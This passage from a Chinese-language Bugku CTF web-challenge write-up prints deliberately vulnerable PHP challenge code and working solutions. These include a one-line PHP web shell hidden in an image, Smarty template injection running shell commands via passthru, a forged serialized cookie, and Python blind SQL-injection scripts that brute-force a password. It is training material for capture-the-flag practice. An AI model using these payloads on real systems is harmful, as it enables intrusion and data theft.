class="string">&quot;multipart/form-data&quot;</span>) !== <span class="literal">False</span>)&#123;</span><br><span class="line">		<span class="variable">$file_ext</span> =  substr(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>);</span><br><span class="line">		<span class="keyword">if</span> (stripos(<span class="variable">$file_ext</span>,<span class="string">&quot;php&quot;</span>) !== <span class="literal">False</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Invalid File&lt;br /&gt;&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">global_filter();</span><br><span class="line"><span class="keyword">if</span> ((stripos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>],<span class="string">&#x27;image&#x27;</span>)!== <span class="literal">False</span>) &amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">10</span>*<span class="number">1024</span>*<span class="number">1024</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] == <span class="number">0</span>)&#123;  <span class="comment">//修改file的type绕过</span></span><br><span class="line">		<span class="variable">$file_ext</span> =  substr(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], strrpos(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>], <span class="string">&#x27;.&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>);  <span class="comment">//取filename.后面的后缀名</span></span><br><span class="line">        <span class="variable">$allowexts</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$allowexts</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;give me a image file not a php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]=<span class="string">&quot;bugku&quot;</span>.date(<span class="string">&#x27;dHis&#x27;</span>).<span class="string">&quot;_&quot;</span>.rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    	<span class="keyword">if</span> (!file_exists(<span class="string">&#x27;./upload/&#x27;</span>))&#123;</span><br><span class="line">    		mkdir (<span class="string">&quot;./upload/&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;chmod 777 /var/www/html/upload&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    	move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Upload Success&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$filepath</span> = <span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">      	<span class="keyword">echo</span> <span class="string">&quot;Stored in: &quot;</span> .<span class="string">&quot;&lt;a href=&#x27;&quot;</span> . <span class="variable">$filepath</span> . <span class="string">&quot;&#x27; target=&#x27;_blank&#x27;&gt;&quot;</span> . <span class="variable">$filepath</span> . <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#125;php</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;You was catched! :) &lt;br /&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>通过分析源代码可知会先判断$type是否是”multipart/form-data”，再判断[“file”][“type”],“type”是否是’image’，最后判断文件的后缀名名是否是数组里的内容。（就算type的内容是multipart/form-data，也会100%被拦截）</p>
<h4 id="字符？正则？"><a href="#字符？正则？" class="headerlink" title="字符？正则？"></a>字符？正则？</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="string">&#x27;2.php&#x27;</span>);</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;flag&#123;********************************&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$IM</span>= preg_match(<span class="string">&quot;/key.*key.&#123;4,7&#125;key:\/.\/(.*key)[a-z][[:punct:]]/i&quot;</span>, trim(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]), <span class="variable">$match</span>);</span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$IM</span> )&#123; </span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&#x27;key is: &#x27;</span>.<span class="variable">$key</span>);  <span class="comment">//匹配就输出flag</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>构造<a target="_blank" rel="noopener" href="http://114.67.175.224:16833/?id=keyaaaakey____akey:/_/_keya:">114.67.175.224:16833/?id=keyaaaakey____akey:/_/_keya:</a></p>
<p>.                                  匹配除 “\n” 之外的任何单个字符</p>
<ul>
<li><pre><code>                            匹配它前面的表达式0次或多次，等价于&#123;0,&#125;
</code></pre>
</li>
</ul>
<p>{4,7}                           最少匹配 4 次且最多匹配 7 次，结合前面的 . 也就是匹配 4 到 7 个任意字符</p>
<p>/                                匹配 / ，这里的 \ 是为了转义</p>
<p>[a-z]                           匹配所有小写字母</p>
<p>[:punct:]                     匹配任何标点符号</p>
<p>/i                                表示不分大小写</p>
<h4 id="需要管理员"><a href="#需要管理员" class="headerlink" title="需要管理员"></a>需要管理员</h4><h5 id="御剑爆破，查出robots-txt里面提示resusl-php-提示"><a href="#御剑爆破，查出robots-txt里面提示resusl-php-提示" class="headerlink" title="御剑爆破，查出robots.txt里面提示resusl.php,提示"></a>御剑爆破，查出robots.txt里面提示resusl.php,提示</h5><p>By bugkuctf.</p>
<p>if ($_GET[x]==$password) 此处省略1w字</p>
<h5 id="访问resusl-php-x-admin即可得到flag"><a href="#访问resusl-php-x-admin即可得到flag" class="headerlink" title="访问resusl.php/?x=admin即可得到flag"></a>访问resusl.php/?x=admin即可得到flag</h5><h4 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h4><h5 id="尝试了asp没成功，看别人写的wp，知道了新的一句话木马"><a href="#尝试了asp没成功，看别人写的wp，知道了新的一句话木马" class="headerlink" title="尝试了asp没成功，看别人写的wp，知道了新的一句话木马"></a>尝试了asp没成功，看别人写的wp，知道了新的一句话木马</h5><p>找到一个<code>&lt;script language=php&gt;eval($_POST[shell])&lt;/script&gt;</code> 是可行的</p>
<blockquote>
<p>这个一句话shell是一个script标签，利用language属性可以指定脚本语言的特性，调用php解释器，运行php代码</p>
</blockquote>
<h5 id="先是找到upload-php，在上传jpg文件，再文件包含。使用图片加php文件即copy-C-Users-Desktop-1-jpg-b-C-Users-Desktop-web-php-a-hack-jpg-的方式上传合并的图片，再包含。注意的是被执行的代码是不会在包含的页面显示出来，这样就可以判断是否会执行。"><a href="#先是找到upload-php，在上传jpg文件，再文件包含。使用图片加php文件即copy-C-Users-Desktop-1-jpg-b-C-Users-Desktop-web-php-a-hack-jpg-的方式上传合并的图片，再包含。注意的是被执行的代码是不会在包含的页面显示出来，这样就可以判断是否会执行。" class="headerlink" title="先是找到upload.php，在上传jpg文件，再文件包含。使用图片加php文件即copy C:\Users\Desktop\1.jpg/b+C:\Users\Desktop\web.php/a hack.jpg 的方式上传合并的图片，再包含。注意的是被执行的代码是不会在包含的页面显示出来，这样就可以判断是否会执行。"></a>先是找到upload.php，在上传jpg文件，再文件包含。使用图片加php文件即copy C:\Users\Desktop\1.jpg/b+C:\Users\Desktop\web.php/a hack.jpg 的方式上传合并的图片，再包含。注意的是被执行的代码是不会在包含的页面显示出来，这样就可以判断是否会执行。</h5><h4 id="聪明的php"><a href="#聪明的php" class="headerlink" title="聪明的php"></a>聪明的php</h4><h5 id="随便输入一个参数，可以得到源代码，发现是Smarty模板，输入-7-7-得到49，验证成功。"><a href="#随便输入一个参数，可以得到源代码，发现是Smarty模板，输入-7-7-得到49，验证成功。" class="headerlink" title="随便输入一个参数，可以得到源代码，发现是Smarty模板，输入{7*7},得到49，验证成功。"></a>随便输入一个参数，可以得到源代码，发现是Smarty模板，输入{7*7},得到49，验证成功。</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pass a parameter <span class="keyword">and</span> maybe the flag file<span class="string">&#x27;s filename is random :&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> &lt;?php include(&#x27;</span>./libs/Smarty.<span class="keyword">class</span>.php<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo &quot;pass a parameter and maybe the flag file&#x27;</span>s filename is random :&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"><span class="subst">$smarty</span> = new Smarty();</span></span><br><span class="line"><span class="string">if(<span class="subst">$_GET</span>)&#123;  </span></span><br><span class="line"><span class="string">highlight_file(&#x27;index.php&#x27;);  </span></span><br><span class="line"><span class="string">foreach (<span class="subst">$_GET</span> AS <span class="subst">$key</span> =&gt; <span class="subst">$value</span>)  </span></span><br><span class="line"><span class="string">&#123;    </span></span><br><span class="line"><span class="string">print <span class="subst">$key</span>.&quot;</span>\n<span class="string">&quot;;    </span></span><br><span class="line"><span class="string">if(preg_match(&quot;</span>/flag|\/flag/i<span class="string">&quot;, <span class="subst">$value</span>))&#123;         //过滤flag和/flag     </span></span><br><span class="line"><span class="string"><span class="subst">$smarty</span>-&gt;display(&#x27;./template.html&#x27;);    &#125;elseif(preg_match(&quot;</span>/system|readfile|gz|exec|<span class="keyword">eval</span>|cat|assert|file|fgets/i<span class="string">&quot;, <span class="subst">$value</span>))&#123;      //过滤出现的所有函数</span></span><br><span class="line"><span class="string"><span class="subst">$smarty</span>-&gt;display(&#x27;./template.html&#x27;);    //里面是假的flag            </span></span><br><span class="line"><span class="string">&#125;else&#123;      </span></span><br><span class="line"><span class="string"><span class="subst">$smarty</span>-&gt;display(&quot;</span><span class="keyword">eval</span>:<span class="string">&quot;.<span class="subst">$value</span>);    </span></span><br><span class="line"><span class="string">&#125;      </span></span><br><span class="line"><span class="string">&#125;&#125;?&gt; </span></span><br></pre></td></tr></table></figure>

<p><strong>php命令执行函数有</strong></p>
<p><strong><a href="https://link.zhihu.com/?target=https://www.php.net/exec">https://www.php.net/exec</a></strong></p>
<blockquote>
<p><strong>exec — 执行一个外部程序</strong><br><strong>passthru — 执行外部程序并且显示原始输出</strong><br><strong>proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码</strong><br><strong>proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。</strong><br><strong>popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。</strong><br><strong>proc_terminate — 杀除由 proc_open 打开的进程</strong><br><strong>shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。</strong><br><strong>system — 执行外部程序，并且显示输出</strong><br><strong>scandir 列出指定路径中的文件和目录</strong><br><strong>eval — 把字符串作为PHP代码执行</strong><br><strong>assert –函数直接将传入的参数当成PHP代码执行</strong></p>
</blockquote>
<p><strong>linux查看文件的命令</strong></p>
<blockquote>
<p><strong>cat tac more less head tail nl static-sh paste od bzmore bzless</strong></p>
</blockquote>
<p><strong>php文件读取函数</strong></p>
<blockquote>
<p><strong>print<em>r() fread() fgets() var</em>dump()</strong></p>
</blockquote>
<p>所以构造/?a={passthru(“ls%20/“)} a _5253 bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var</p>
<p>?a={passthru(“more%20/_5253”)}</p>
<p>即可得到flag</p>
<h4 id="点login咋没反应"><a href="#点login咋没反应" class="headerlink" title="点login咋没反应"></a>点login咋没反应</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$KEY=&#x27;ctf.bugku.com&#x27;;</span><br><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">$cookie = $_COOKIE[&#x27;BUGKU&#x27;];</span><br><span class="line">if(isset($_GET[&#x27;3626&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">elseif (unserialize($cookie) === &quot;$KEY&quot;)</span><br><span class="line">&#123;   </span><br><span class="line">    echo &quot;$flag&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;</span><br><span class="line">  &lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt;</span><br><span class="line">  &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="请求头增加：cookie-BUGKU-s-13-”ctf-bugku-com”-即可得到flag"><a href="#请求头增加：cookie-BUGKU-s-13-”ctf-bugku-com”-即可得到flag" class="headerlink" title="请求头增加：cookie: BUGKU=s:13:”ctf.bugku.com”;即可得到flag"></a>请求头增加：cookie: BUGKU=s:13:”ctf.bugku.com”;即可得到flag</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span>=<span class="string">&quot;ctf.bugku.com&quot;</span>;</span><br><span class="line"><span class="variable">$content</span>=serialize(<span class="variable">$x</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$content</span>); <span class="comment">//序列化</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>1.需要用bs测试哪些是违规字符</p>
<p>a’or(1&lt;&gt;1)#username does not exist!   取值为假<br>a‘or(1&lt;&gt;2)#password error!                  取值为真</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">                        <span class="comment">#判断数据库的长度为8</span></span><br><span class="line">url=<span class="string">&#x27;http://114.67.175.224:18070/index.php&#x27;</span></span><br><span class="line">r=requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;a\&#x27;or(length(database())&gt;&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;)#&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;123&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res1=r.post(url,data=data)</span><br><span class="line"></span><br><span class="line">    m=res1.text.split(<span class="string">&#x27;&lt;p align=\&#x27;center\&#x27;&gt;&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&quot;&lt;/p&gt;&lt;/font&gt;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#username does not exist!  0</span></span><br><span class="line"><span class="comment">#password error!  1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  requests</span><br><span class="line">string_all=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;</span>  //密码里一般是md5加密后的，都是小写</span><br><span class="line">url=<span class="string">&quot;http://114.67.175.224:18070/index.php&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">fla=<span class="number">0</span></span><br><span class="line">r=requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string_all:</span><br><span class="line">        j=j+flag </span><br><span class="line">        payload=<span class="string">&quot;a&#x27;or(!(substr((password)from(&#123;0&#125;))&lt;&gt;&#x27;&#123;1&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>((-i), j)  //从-i到以后</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        response=r.post(url,data=data)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;password error&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            flag=j</span><br><span class="line">            <span class="built_in">print</span>(flag+<span class="string">&quot;this cycle is finished with right result&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> j[<span class="number">0</span>]==<span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(flag + <span class="string">&quot;this cycle is finished with the end&quot;</span>)</span><br><span class="line">            fla=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> fla==<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password is&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#username does not exist!  0</span></span><br><span class="line"><span class="comment">#password error!  1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#4DCC88F8F1BC05E7C2AD1A60288481A2</span></span><br><span class="line">md5解密是bugkuctf，采用的方式是从后往前爆破密码中的内容</span><br></pre></td></tr></table></figure>

<p>?zero=ZmxhZw==&amp;first=girl|.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$zero</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;zero&#x27;</span>];</span><br><span class="line"><span class="variable">$first</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;first&#x27;</span>];</span><br><span class="line"><span class="variable">$second</span>=<span class="variable">$zero</span>.<span class="variable">$first</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match_all(<span class="string">&quot;/Yeedo|wants|a|girl|friend|or|a|flag/i&quot;</span>,<span class="variable">$second</span>))&#123;  <span class="comment">//匹配里面的任何一个，不分大小写</span></span><br><span class="line">  <span class="variable">$key</span>=<span class="variable">$second</span>;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\.\.|flag/&quot;</span>,<span class="variable">$key</span>))&#123; <span class="comment">//匹配..或flag</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Noooood hacker!&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$third</span>=<span class="variable">$first</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\\|\056\160\150\x70/i&quot;</span>,<span class="variable">$third</span>))&#123; <span class="comment">//形如\xnn为16进制(Hex)，\nnn为8进制(Oct)在计算机导论中有讲过 ,php中将自动识别,其代表着.php</span></span><br><span class="line"><span class="comment">//这里有个优先级的问题，当匹配字符串中有字符串转义时，先进行字符串转义，然后进行正则匹配的相关转义。</span></span><br><span class="line">      <span class="variable">$end</span>=substr(<span class="variable">$third</span>,<span class="number">5</span>);</span><br><span class="line">      highlight_file(base64_decode(<span class="variable">$zero</span>).<span class="variable">$end</span>);<span class="comment">//maybe flag in flag.php</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="“-056-160-150-x70-i-”-后面的为-php，自动转换。需要注意的是-有两次转义，第一次为-第二次为-。所以匹配的是-php"><a href="#“-056-160-150-x70-i-”-后面的为-php，自动转换。需要注意的是-有两次转义，第一次为-第二次为-。所以匹配的是-php" class="headerlink" title="“/\|\056\160\150\x70/i ”   后面的为.php，自动转换。需要注意的是\ \ | ,有两次转义，第一次为\ |,第二次为 |。所以匹配的是|.php."></a>“/\|\056\160\150\x70/i ”   后面的为.php，自动转换。需要注意的是\ \ | ,有两次转义，第一次为\ |,第二次为 |。所以匹配的是|.php.</h5><h6 id="综上为-zero-ZmxhZw-amp-first-girl-php-zero代表着是flag。"><a href="#综上为-zero-ZmxhZw-amp-first-girl-php-zero代表着是flag。" class="headerlink" title="综上为?zero=ZmxhZw==&amp;first=girl|.php    zero代表着是flag。"></a>综上为?zero=ZmxhZw==&amp;first=girl|.php    zero代表着是flag。</h6><h5 id="正则：-‘-’匹配’-’-‘-’匹配’-’-而如果是-匹配’-’-‘-’经过测试拦截了“-”-这两个都要拦截，不只是“-”"><a href="#正则：-‘-’匹配’-’-‘-’匹配’-’-而如果是-匹配’-’-‘-’经过测试拦截了“-”-这两个都要拦截，不只是“-”" class="headerlink" title="正则： ‘\ |’匹配’|’ ‘\ \ |’匹配’|’ 而如果是\ \ \ |匹配’\ |’ ‘\ \ \ \ |’经过测试拦截了“,\ \” 这两个都要拦截，不只是“\ \”"></a>正则： ‘\ |’匹配’|’ ‘\ \ |’匹配’|’ 而如果是\ \ \ |匹配’\ |’ ‘\ \ \ \ |’经过测试拦截了“,\ \” 这两个都要拦截，不只是“\ \”</h5><h4 id="闪电十六鞭"><a href="#闪电十六鞭" class="headerlink" title="闪电十六鞭"></a>闪电十六鞭</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">p<span class="meta">&lt;?php</span></span><br><span class="line">  error_reporting(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$exam</span> = <span class="string">&#x27;return\&#x27;&#x27;</span>.sha1(time()).<span 